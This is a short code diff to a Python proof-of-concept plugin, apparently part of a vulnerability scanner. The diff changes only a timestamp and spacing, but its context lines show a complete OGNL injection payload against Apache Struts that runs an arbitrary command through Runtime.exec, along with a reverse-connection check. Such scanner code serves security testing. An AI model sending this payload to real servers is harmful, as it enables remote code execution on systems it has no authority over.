@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-22 10:33:13
 LastEditors: recar
-LastEditTime: 2022-03-22 15:41:35
+LastEditTime: 2022-03-22 18:48:06
 '''
 
 from plugins.poc.base import PocBase
@@ -31,7 +31,7 @@ class Poc(PocBase):
         data = {
             "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+cmd+"'))}"
         }
-        return self.post(self.base_url, data=data, timeout=3)
+        return self.post(self.base_url, data=data,timeout=3)
 
     def verify(self, response):
         if self.reverse.verify():
